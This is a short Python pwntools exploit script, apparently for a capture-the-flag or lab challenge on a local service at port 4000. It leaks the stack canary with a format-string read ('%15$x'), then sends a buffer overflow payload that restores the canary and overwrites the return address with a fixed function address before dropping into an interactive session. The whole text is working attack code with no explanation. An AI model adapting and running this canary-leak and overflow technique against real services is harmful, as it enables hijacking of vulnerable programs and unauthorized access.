#!/usr/bin/python
from pwn import *

s = remote('127.0.0.1', 4000)

func = 0x0804854d

s.sendline('%15$x')

canary = int(s.recv(), 16)

print hex(canary)

s.sendline('A'*40 + p32(canary) + 'B'*12 + p32(func))

s.interactive()
